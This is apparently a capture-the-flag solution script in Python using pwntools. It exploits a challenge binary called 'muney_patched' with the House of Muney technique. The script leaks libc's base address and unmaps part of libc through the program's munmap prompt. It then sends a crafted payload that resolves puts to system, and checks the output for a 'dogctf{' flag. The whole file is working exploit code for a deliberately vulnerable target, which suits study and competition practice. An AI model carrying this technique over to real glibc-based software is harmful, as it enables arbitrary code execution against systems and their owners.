#!/usr/bin/env python3

from pwn import *
from doglib.muney import house_of_muney

context.log_level = "info"

exe = ELF("./muney_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.34.so", checksec=False)

context.binary = exe


def conn():
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p,gdbscript='''

''')
        sleep(2)
    return p


def main():
    p = conn()

    p.recvuntil(b"stdout: ")
    stdout_addr = int(p.recvline().strip(), 16)
    libc.address = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
    log.info("libc base: %#x", libc.address)

    payload = house_of_muney(libc, {"puts": libc.symbols["system"]})
    log.info("payload size: %#x", len(payload))

    munmap_addr = libc.address
    munmap_size = len(payload)

    p.sendafter(b"munmap addr:", hex(munmap_addr).encode().ljust(0xF, b"\x00"))
    p.sendafter(b"munmap size:", hex(munmap_size).encode().ljust(0xF, b"\x00"))

    p.recvuntil(b"munmap success")

    p.send(payload)

    result = p.recvall(timeout=3)
    log.info("result: %s", result.decode(errors="replace"))

    if b"dogctf{" in result:
        log.success("FLAG: %s", result.strip().decode())
    else:
        log.failure("exploit did not return flag")

    p.close()


if __name__ == "__main__":
    main()
